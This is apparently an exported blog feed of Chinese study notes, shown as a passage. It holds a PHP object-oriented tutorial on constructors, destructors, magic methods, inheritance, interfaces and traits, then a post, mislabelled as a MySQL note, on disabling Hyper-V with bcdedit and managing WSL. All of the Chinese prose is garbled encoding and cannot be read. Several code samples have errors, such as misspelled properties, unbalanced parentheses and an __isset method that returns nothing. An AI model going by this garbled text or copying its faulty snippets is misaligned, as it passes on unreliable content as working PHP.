<p>ä¸‹é¢è¿™ä¸ªæœ‰ç‚¹ä¸åŒï¼Œä»”ç»†åˆ†æä¸€ä¸‹ç»“æœå§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $color;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new cat();</span><br><span class="line">$a-&gt;name &#x3D; &#39;Tom&#39;;</span><br><span class="line">$a-&gt;age &#x3D; &#39;2&#39;;</span><br><span class="line">$a-&gt;color &#x3D; &#39;red&#39;;</span><br><span class="line">$b &#x3D; &amp;$a;&#x2F;&#x2F;ä¼ å€</span><br><span class="line">$b &#x3D; &#39;blue&#39;;</span><br><span class="line">echo $a-&gt;color;&#x2F;&#x2F;ä¼šæŠ¥é”™å“¦</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
<p><strong>æˆå‘˜å‡½æ•°</strong><br>åŸºæœ¬æ ·å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line">    è®¿é—®ä¿®é¥°ç¬¦ function å‡½æ•°å(å‚æ•°)&#123;</span><br><span class="line">        alalalal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>æ„é€ å‡½æ•°</strong><br>åœ¨classé‡Œé¢çš„æ„é€ å‡½æ•°<br>æ„é€ å‡½æ•°å˜›ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡æ—¶ç»™å±æ€§èµ‹åˆå§‹å€¼å’Œè°ƒç”¨æˆå‘˜å‡½æ•°<br>æ„é€ å‡½æ•°çš„è®¿é—®ä¿®é¥°ç¬¦é»˜è®¤ä¸ºpublic<br>æ²¡æœ‰è¿”å›å€¼<br>ä¸€ä¸ªç±»ä¸­åªèƒ½æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°<br>æ ·å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line">    public $color;</span><br><span class="line">    public $age;</span><br><span class="line">    è®¿é—®ä¿®é¥°ç¬¦ function __construct($param_color,$param_age)&#123;</span><br><span class="line">        $this-&gt;color &#x3D; $param_color;</span><br><span class="line">        $this-&gt;age &#x3D; $param_age;&#x2F;&#x2F;$thisä»£è¡¨è°ƒç”¨è¿™ä¸ªæ„é€ å‡½æ•°çš„å¯¹è±¡</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$coco &#x3D; new classname(&#39;red&#39;,&#39;12&#39;);&#x2F;&#x2F;åœ¨åˆ›å»ºè¿™ä¸ªæ–°çš„å¯¹è±¡Cocoæ—¶ç³»ç»Ÿè‡ªåŠ¨å®Œæˆäº†å¯¹è±¡çš„å±æ€§å®šä¹‰</span><br></pre></td></tr></table></figure>
<p><strong>ææ„å‡½æ•°</strong><br>ææ„å‡½æ•°(destructor) ä¸æ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡ç»“æŸå…¶ç”Ÿå‘½å‘¨æœŸæ—¶ï¼ˆä¾‹å¦‚å¯¹è±¡æ‰€åœ¨çš„å‡½æ•°å·²è°ƒç”¨å®Œæ¯•ï¼‰ï¼Œç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œææ„å‡½æ•°<br>é‡Šæ”¾èµ„æºï¼Œå…³é—­æ–‡ä»¶<br>é»˜è®¤æƒ…å†µä¸‹ï¼Œå…ˆåˆ›å»ºçš„å¯¹è±¡åé”€æ¯ï¼ˆæ ˆåŒºçš„åˆ†é…ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line">    function __destruct()&#123;&#x2F;&#x2F;No param</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ç¨‹åºç»“æŸå‰ä¹Ÿä¼šé”€æ¯å¯¹è±¡<br>å½“æ²¡æœ‰å˜é‡æŒ‡å‘å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±ä¼šè¢«é”€æ¯<br>åœ¨é”€æ¯æ—¶å°±ä¼šè°ƒç”¨ææ„å‡½æ•°<br>ææ„å‡½æ•°å¹¶ä¸æ˜¯é”€æ¯å¯¹è±¡æœ¬èº«ï¼Œè€Œæ˜¯é”€æ¯å¯¹è±¡åˆ›é€ çš„ç›¸å…³èµ„æºï¼Œå¦‚æ•°æ®åº“è¿æ¥<br>PHPçš„å†…å­˜å›æ”¶æœºåˆ¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo &quot;å½“å¯¹è±¡é”€æ¯æ—¶ä¼šè°ƒç”¨ï¼ï¼ï¼&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; $b &#x3D; $c &#x3D; new test();</span><br><span class="line"></span><br><span class="line">$a &#x3D; null;</span><br><span class="line">unset($b);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;hr &#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>æ­¤ä¾‹å­ï¼Œå¦‚ä¸Šå›¾ï¼Œæœ‰ä¸‰ä¸ªå˜é‡å¼•ç”¨<code>$a,$b,$c</code>æŒ‡å‘testå¯¹è±¡ï¼Œtestå¯¹è±¡å°±æœ‰3ä¸ªå¼•ç”¨è®¡æ•°ï¼Œå½“<code>$a</code> = nullæ—¶ï¼Œ<code>$a</code>å¯¹testå¯¹è±¡çš„å¼•ç”¨ä¸¢å¤±ï¼Œè®¡æ•°-1ï¼Œå˜ä¸º2ï¼Œå½“<code>$b</code>è¢«unset()æ—¶ï¼Œ<code>$b</code>å¯¹testå¯¹è±¡çš„å¼•ç”¨ä¹Ÿä¸¢å¤±äº†ï¼Œè®¡æ•°å†-1ï¼Œå˜ä¸º1ï¼Œæœ€åé¡µé¢åŠ è½½å®Œæ¯•ï¼Œ<code>$c</code>æŒ‡å‘testå¯¹è±¡çš„å¼•ç”¨è‡ªåŠ¨è¢«é‡Šæ”¾ï¼Œæ­¤æ—¶è®¡æ•°å†-1ï¼Œå˜ä¸º0ï¼Œtestå¯¹è±¡å·²æ²¡æœ‰å˜é‡å¼•ç”¨ï¼Œå°±ä¼šè¢«é”€æ¯ï¼Œæ­¤æ—¶å°±ä¼šè°ƒç”¨ææ„å‡½æ•°ã€‚<br><strong>è®¿é—®ä¿®é¥°ç¬¦åˆè®²</strong><br>ç±»ä¸­çš„æ–¹æ³•å¯ä»¥è¢«å®šä¹‰ä¸ºå…¬æœ‰ï¼ˆpublicï¼‰ï¼Œç§æœ‰(private)æˆ–å—ä¿æŠ¤(protected)ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¿™äº›å…³é”®å­—ï¼Œåˆ™è¯¥æ–¹æ³•é»˜è®¤ä¸ºå…¬æœ‰ã€‚<br>å…¶ä¸­ï¼Œpublicå®šä¹‰çš„æ–¹æ³•æˆ–å±æ€§åœ¨ç±»çš„å†…éƒ¨å’Œå¤–éƒ¨éƒ½å¯ä»¥è°ƒç”¨æˆ–è¯»å–<br>privateå’Œprotectedåªèƒ½åœ¨ç±»çš„å†…éƒ¨è°ƒç”¨æˆ–è¯»å–ï¼Œä»–ä»¬çš„ä¸åŒåé¢è®²è§£ã€‚</p>
<p><strong>é­”æœ¯æ–¹æ³•</strong><br>__set()<br><strong>è°ƒç”¨æ¡ä»¶</strong>ï¼šåœ¨ç±»çš„<strong>å¤–éƒ¨</strong>å¯¹å—ä¿æŠ¤çš„æˆ–è€…ç§æœ‰çš„å±æ€§èµ‹å€¼<br>å¯ä»¥å¯¹ç¨‹åºæœ‰æ›´å¥½çš„æ§åˆ¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Dog</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $sex;</span><br><span class="line">    public function __construct($name,$sex)&#123;&#x2F;&#x2F;è¿™é‡Œæ²¡æœ‰é—®é¢˜ï¼Œ$sexåªæ˜¯ä¸ªå‚æ•°å“¦ï¼Œä»€ä¹ˆåå­—éƒ½è¡Œ</span><br><span class="line">        $this-&gt;name &#x3D; $name;&#x2F;&#x2F;ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œè¿˜æ˜¯å°½é‡è§„èŒƒå‚æ•°çš„å‘½å</span><br><span class="line">        $this-&gt;age &#x3D; $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($name,$value)&#123;</span><br><span class="line">        $this-&gt;$name &#x3D; $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;åœ¨ç±»çš„å¤–éƒ¨</span><br><span class="line">$coco &#x3D; new Dog(&quot;titi&quot;,1);</span><br><span class="line">echo $coco-&gt;name;</span><br><span class="line">echo $coco-&gt;age;</span><br><span class="line">$coco-&gt;age &#x3D; 2;</span><br><span class="line">$coco-&gt;name&#x3D;&quot;coco&quot;;</span><br><span class="line">echo $coco-&gt;name;</span><br><span class="line">echo $coco-&gt;age;</span><br></pre></td></tr></table></figure>
<p>ä¸å…‰å¯ä»¥å¯¹å…¶èµ‹å€¼ï¼Œè¿˜å¯ä»¥å®Œæˆå¯¹å€¼çš„ä¸€äº›æ“ä½œ<br>æ¯”å¦‚åˆ¤æ–­è¦ä¿®æ”¹çš„å€¼æ˜¯å¦ç¬¦åˆä¿®æ”¹è¦æ±‚ç­‰ç­‰ï¼Œä¸‹é¢çš„å‡ ä¸ªé­”æœ¯æ–¹æ³•ä¹Ÿä¸€æ ·<br>__get<br><strong>è°ƒç”¨æ¡ä»¶</strong>ï¼šåœ¨ç±»çš„<strong>å¤–éƒ¨</strong>å¾—åˆ°å—ä¿æŠ¤çš„æˆ–ç§æœ‰çš„å±æ€§çš„å€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Dog</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    public function __construct($value1,$value2)&#123;</span><br><span class="line">        $this-&gt;nmae &#x3D; $value1;</span><br><span class="line">        $this-&gt;age&#x3D; $value2;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($name)&#123;</span><br><span class="line">        return $this-&gt;$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;åœ¨ç±»çš„å¤–éƒ¨</span><br><span class="line">$coco &#x3D; new Dog(&quot;titi&quot;,1);</span><br><span class="line">echo $coco-&gt;name;</span><br><span class="line">echo $coco-&gt;age;</span><br></pre></td></tr></table></figure>
<p>__isset()<br><strong>è°ƒç”¨æ¡ä»¶</strong>ï¼šåœ¨<strong>å¤–éƒ¨</strong> isset()å—ä¿æŠ¤çš„æˆ–è€…ç§å¯†çš„å±æ€§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Dog</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    public function __construct($name,$age)&#123;</span><br><span class="line">        $this-&gt;nmae &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __isset($name)&#123;</span><br><span class="line">        isset($this-&gt;$name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;åœ¨ç±»çš„å¤–éƒ¨</span><br><span class="line">$coco &#x3D; new Dog(&quot;titi&quot;,1);</span><br><span class="line">var_dump(isset($coco-&gt;age));&#x2F;&#x2F;è¿™ä¸ªè¿”å›true æˆ–è€…faulse</span><br></pre></td></tr></table></figure>
<p>__unset<br><strong>è°ƒç”¨æ¡ä»¶</strong>ï¼šåœ¨å¤–éƒ¨é‡Šæ”¾å—ä¿æŠ¤çš„æˆ–è€…ç§å¯†çš„å±æ€§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Dog</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    public function __construct($name,$sex)&#123;</span><br><span class="line">        $this-&gt;nmae &#x3D; $name;</span><br><span class="line">        $this-&gt;sex &#x3D; $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __unset($name)&#123;</span><br><span class="line">        unset($this-&gt;$name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;åœ¨ç±»çš„å¤–éƒ¨</span><br><span class="line">$coco &#x3D; new Dog(&quot;titi&quot;,1);</span><br><span class="line">unset($coco-&gt;$age);</span><br><span class="line">var_dump(($coco);</span><br></pre></td></tr></table></figure>
<h2 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a><strong>ç»§æ‰¿</strong></h2><p><strong>çˆ¶ç±»</strong>ï¼šä¸€ä¸ªç±»è¢«å…¶ä»–ç±»ç»§æ‰¿ï¼Œå¯å°†è¯¥ç±»ç§°ä¸ºçˆ¶ç±»ï¼Œæˆ–åŸºç±»ï¼Œæˆ–è¶…ç±»ã€‚<br><strong>å­ç±»</strong>ï¼šä¸€ä¸ªç±»ç»§æ‰¿å…¶ä»–ç±»ç§°ä¸ºå­ç±»ï¼Œä¹Ÿå¯ç§°ä¸ºæ´¾ç”Ÿç±»ã€‚<br><strong>è®¿é—®ä¿®é¥°ç¬¦è¡¥å……</strong>ï¼š<br>public,protectedä¿®é¥°çš„æ–¹æ³•å’Œå±æ€§å¯è¢«ç»§æ‰¿ï¼Œè€Œprivateä¸å¯<br><strong>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒPHPä¸­ï¼Œå¦‚æœåœ¨å­ç±»ä¸­åˆ›å»ºäº†æ„é€ å‡½æ•°ï¼Œåˆ™å­ç±»ä¸ä¼šåœ¨æ„é€ å‡½æ•°ä¸­éšå¼è°ƒç”¨çˆ¶ç±»ä¸­çš„æ„é€ å‡½æ•°ï¼Œè¦æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œéœ€è¦åœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨parent::__construct()ã€‚å¦‚æœå­ç±»ä¸­æ²¡æœ‰å®šä¹‰æ„é€ å‡½æ•°åˆ™ä¼šå¦‚åŒæ™®é€šç±»ä¸€æ ·ä»çˆ¶ç±»ç»§æ‰¿ï¼ˆéprivateï¼‰</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class A&#x2F;&#x2F;çˆ¶ç±»</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    protected $job;</span><br><span class="line">    function __construct($name,$age,$job)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;job &#x3D; $job;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function speak()&#123;</span><br><span class="line">        echo &quot;hello&quot;.$this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B extends A&#x2F;&#x2F;å­ç±»</span><br><span class="line">&#123;</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;&lt;br &#x2F;&gt;eat&quot;.$this-&gt;job;&#x2F;&#x2F;å¦‚æœæ˜¯ageä¼šå¦‚ä½•å‘¢ï¼Ÿ</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new B(&quot;Tom&quot;,18,&quot;student&quot;);</span><br><span class="line">$a-&gt;speak();</span><br><span class="line">$a-&gt;eat();</span><br></pre></td></tr></table></figure>
<p><strong>æ–¹æ³•é‡å†™</strong><br>å¦‚æœä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•ä¸èƒ½æ»¡è¶³å­ç±»çš„éœ€æ±‚ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œæ”¹å†™ï¼Œè¿™ä¸ªè¿‡ç¨‹å«æ–¹æ³•çš„è¦†ç›–ï¼ˆoverrideï¼‰ï¼Œä¹Ÿç§°ä¸ºæ–¹æ³•çš„é‡å†™ã€‚<br><strong>æŠ½è±¡æ–¹æ³•å’ŒæŠ½è±¡ç±»</strong><br>å«æœ‰æŠ½è±¡æ–¹æ³•çš„ä¸€å®šæ˜¯æŠ½è±¡ç±»<br>æŠ½è±¡ç±»ä¸ä¸€å®šå«æœ‰æŠ½è±¡æ–¹æ³•<br>æŠ½è±¡ç±»ä¸­å¯ä»¥æœ‰ä¸€èˆ¬çš„å‡½æ•°<br>æŠ½è±¡ç±»æ— æ³•å®ä¾‹åŒ–ï¼Œåªèƒ½ç”±ä¸€ä¸ªç»§æ‰¿ä»–çš„å­ç±»å®ä¾‹åŒ–ï¼Œç»§æ‰¿ä»–çš„å­ç±»å°†å®ç°æ‰€æœ‰çš„æŠ½è±¡æ–¹æ³•ï¼ˆé‡å†™ï¼‰<br>æŠ½è±¡ä½“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abstract class Father&#123;</span><br><span class="line">    public abstract function run();&#x2F;&#x2F;æŠ½è±¡æ–¹æ³•æ˜¯æ²¡æœ‰æ–¹æ³•ä½“çš„</span><br><span class="line">    public function eat()&#123;&#x2F;&#x2F;è¿™ä¸ªå°±æ˜¯ä¸ªæ™®é€šçš„æˆå‘˜æ–¹æ³•ï¼ˆå‡½æ•°ï¼‰</span><br><span class="line">        echo &quot;eat&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class son extends Father&#123;</span><br><span class="line">    public function run()&#123;</span><br><span class="line">        &#x2F;&#x2F;çˆ¶å€ºå­å¿</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>æŠ½è±¡ç±»å…¶å®å°±æ˜¯ä»‹äºæ™®é€šç±»å’Œæ¥å£ä¹‹é—´çš„ä¸€ä¸ªç±»ï¼Œæ™®é€šç±»éœ€è¦å®ç°æ‰€æœ‰æ–¹æ³•ï¼Œæ¥å£æ‰€æœ‰æ–¹æ³•éƒ½ä¸éœ€è¦å®ç°ï¼Œè€ŒæŠ½è±¡ç±»å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦å»é€‰æ‹©å®ç°éƒ¨åˆ†æ–¹æ³•ï¼›ä½†æ˜¯ä¸€æ—¦ç±»é‡Œé¢æœ‰æŠ½è±¡æ–¹æ³•ï¼Œè¿™ä¸ªç±»å°±å¿…é¡»æ˜¯æŠ½è±¡ç±»ï¼Œå¦å¤–æ³¨æ„ï¼ŒæŠ½è±¡ç±»è·Ÿæ¥å£ä¸€æ ·ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ä¸ºå¯¹è±¡ï¼Œåªèƒ½è¢«æ™®é€šç±»ç»§æ‰¿ï¼Œï¼Œå…¶å®æŠ½è±¡ç±»åŒæ ·ä½“ç°äº†é¢å‘å¯¹è±¡çš„å¤šæ€ç°è±¡<br>æ³¨æ„ï¼š<br>æœ‰ä»€ä¹ˆå¯ä»¥å®ç°ç±»ä¼¼å¤šé‡ç»§æ‰¿çš„ä¸œè¥¿å‘¢ï¼Ÿæ¥ä¸‹æ¥ä»‹ç»æ¥å£<br><strong>æ¥å£ï¼šinterface</strong><br>æ¥å£æ˜¯é€šè¿‡ interface å…³é”®å­—æ¥å®šä¹‰çš„ï¼Œå°±åƒå®šä¹‰ä¸€ä¸ªæ ‡å‡†çš„ç±»ä¸€æ ·ï¼Œä½†å…¶ä¸­å®šä¹‰æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯ç©ºçš„ã€‚</p>
<blockquote>
<p>æ¥å£æ˜¯ä¸€ç§å¯¹è±¡ç”¨äºä¸å¤–ç•Œè¿›è¡Œäº¤äº’è¡Œä¸ºçš„çº¦æŸï¼Œå¯¹äºå®ç°æ¥å£çš„ç±»ï¼Œè¦æ±‚ä¸€å®šè¦æ»¡è¶³æ¥å£æ‰€æŒ‡å®šçš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥æˆä¸ºæ»¡è¶³æ¥å£çš„â€œç‰¹å¾â€ã€‚<br>OOPä¸­ç±»æœ‰ä¸€ç§æ€§è´¨å«â€œå°è£…â€ï¼Œå°±æ˜¯è¦æ±‚ç±»å†…éƒ¨ä¸å¤–ç•Œç¯å¢ƒè¦è¿›è¡Œéš”ç¦»ï¼Œè€Œç±»åˆéœ€è¦å®ç°ä¸€å®šçš„ä¸šåŠ¡åŠŸèƒ½ï¼Œå› æ­¤å°±éœ€è¦æš´éœ²å‡ºèƒ½å¤Ÿå¯¹å¤–ç•Œäº§ç”Ÿå½±å“çš„éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†å°±è¢«ç§°ä¹‹ä¸ºæ¥å£ã€‚ â€”â€”â€“è®¸è‡´ä¸­å¤§ä½¬</p>
</blockquote>
<p><strong>æˆ‘çš„ç†è§£</strong>ï¼šç›¸å½“äºä¸€ä¸ªèœå•ï¼Œåˆ—å‡ºäº†é‡Œé¢çš„åŠŸèƒ½ï¼ŒåŠŸèƒ½æ€ä¹ˆå®ç°å¤–ç•Œä¸ç”¨ç®¡ï¼Œåªè¦ç”¨å°±å¯ä»¥</p>
<p>æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•éƒ½å¿…é¡»æ˜¯<strong>å…¬æœ‰</strong>ï¼Œè¿™æ˜¯æ¥å£çš„ç‰¹æ€§ã€‚<br>è¦å®ç°ä¸€ä¸ªæ¥å£ï¼Œä½¿ç”¨ implements æ“ä½œç¬¦ã€‚ç±»ä¸­å¿…é¡»å®ç°æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼Œå¦åˆ™ä¼šæŠ¥ä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚ç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œç”¨é€—å·æ¥åˆ†éš”å¤šä¸ªæ¥å£çš„åç§°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface C</span><br><span class="line">&#123;</span><br><span class="line">    function run();&#x2F;&#x2F;å› ä¸ºå…¬æœ‰æ˜¯é»˜è®¤å€¼ï¼Œsoç•¥</span><br><span class="line">&#125;</span><br><span class="line">interface E</span><br><span class="line">&#123;</span><br><span class="line">    function walk();</span><br><span class="line">&#125;</span><br><span class="line">class D implements C,E</span><br><span class="line">&#123;</span><br><span class="line">    function  run()&#123;</span><br><span class="line">        echo &quot;&lt;br&#x2F;&gt;run&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function  walk()&#123;</span><br><span class="line">        echo &quot;&lt;br&#x2F;&gt;walk&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•æ˜¯æ—¢èƒ½å®ç°ç±»ä¼¼å¤šç»§æ‰¿åˆèƒ½ä¸å¸¦æ¥éº»çƒ¦å‘¢ï¼Ÿ<br><strong>Trait</strong><br>å¾ˆåƒæ¥å£ï¼Œä½†æ˜¯æ¥å£ä¸­çš„æ–¹æ³•éƒ½æ˜¯ä¸ä¼šå†™çš„ï¼Œåªæ˜¯æ”¾äº†ä¸€ä¸ªå®šä¹‰ï¼Œä½†æ˜¯Traitå°±ä¼šåœ¨å®šä¹‰è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™å†™å¥½å…·ä½“çš„æ“ä½œï¼Œä¾‹å­å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trait</span><br><span class="line">traitèƒ½åœ¨å®šä¹‰ä¸€ä¸ªæ ‡å‡†ç±»çš„æ—¶å€™å®šä¹‰å®ƒçš„æ–¹æ³•</span><br><span class="line">trait SayWorld &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#39;Hello World!&#39;;&#x2F;&#x2F;traitä¸­çš„</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class MyHelloWorld extends Base &#123;</span><br><span class="line">    use SayWorld;&#x2F;&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ä¼˜å…ˆçº§</strong><br>å½“å‰ç±»ä¸­çš„æ–¹æ³•æˆ–å±æ€§å¤§äºtraitä¸­çš„å¤§äºçˆ¶ç±»ä¸­çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Base &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#39;Hello &#39;;&#x2F;&#x2F;çˆ¶ç±»ä¸­çš„</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trait SayWorld &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#39;World&#39;;&#x2F;&#x2F;traitä¸­çš„</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyHelloWorld extends Base &#123;</span><br><span class="line">    use SayWorld;</span><br><span class="line">    public function sayHello()&#123;&#x2F;&#x2F;å½“å‰ç±»çš„</span><br><span class="line">        echo &#39;!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o &#x3D; new MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line">&#x2F;&#x2F;è¾“å‡ºç»“æœæ˜¯ !</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>å¼•ç”¨å¤šä¸ªtrait</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">trait Hello &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#39;Hello &#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trait World &#123;</span><br><span class="line">    public function sayWorld() &#123;</span><br><span class="line">        echo &#39;World&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyHelloWorld &#123;</span><br><span class="line">    use Hello, World;</span><br><span class="line">    public function sayExclamationMark() &#123;</span><br><span class="line">        echo &#39;!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysqlæ•°æ®åº“</title>
    <url>/2019/05/20/Note/%E8%A7%A3%E5%86%B3%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8Ehyper-v%E5%86%B2%E7%AA%81/</url>
    <content><![CDATA[<h1 id="è™šæ‹Ÿæœºä¸hyper-vå†²çª"><a href="#è™šæ‹Ÿæœºä¸hyper-vå†²çª" class="headerlink" title="è™šæ‹Ÿæœºä¸hyper-vå†²çª"></a>è™šæ‹Ÿæœºä¸hyper-vå†²çª</h1><ul>
<li>é€šè¿‡å‘½ä»¤å…³é—­Hyper-Vï¼ˆæ§åˆ¶é¢æ¿å…³é—­Hyper-Vèµ·ä¸åˆ°å†³å®šæ€§ä½œç”¨ï¼Œè¦å½»åº•å…³é—­Hyper-Vï¼‰</li>
<li>ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡ŒWindows Powershell (ç®¡ç†å‘˜)ï¼ˆWindowsé”®+Xï¼‰</li>
<li>è¿è¡Œä¸‹é¢å‘½ä»¤å¹¶é‡å¯ç”µè„‘ï¼š</li>
</ul>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#å…³é—­hype-V</span><br><span class="line">bcdedit &#x2F;set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure>
<ul>
<li>æƒ³è¦ä½¿ç”¨wslæ—¶,ä¸‹é¢æ˜¯ç›¸å…³å‘½ä»¤</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#å¯ç”¨hype-V</span><br><span class="line">bcdedit &#x2F;set hypervisorlaunchtype auto start</span><br><span class="line"></span><br><span class="line">#è½¬æ¢ubuntuçš„wslç‰ˆæœ¬</span><br><span class="line">wsl --set-version Ubuntu 2</span><br><span class="line"></span><br><span class="line">#æŸ¥è¯¢å·²ç»å®‰è£…çš„wslç‰ˆæœ¬</span><br><span class="line">wsl -l -V</span><br><span class="line">#æˆ–è€…</span><br><span class="line">wsl --list --version</span><br><span class="line"></span><br><span class="line">#è®¾ç½®wslé»˜è®¤å¯åŠ¨ç‰ˆæœ¬</span><br><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysqlæ•°æ®åº“</title>
    <url>/2019/05/20/Note/%E8%AE%B2%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
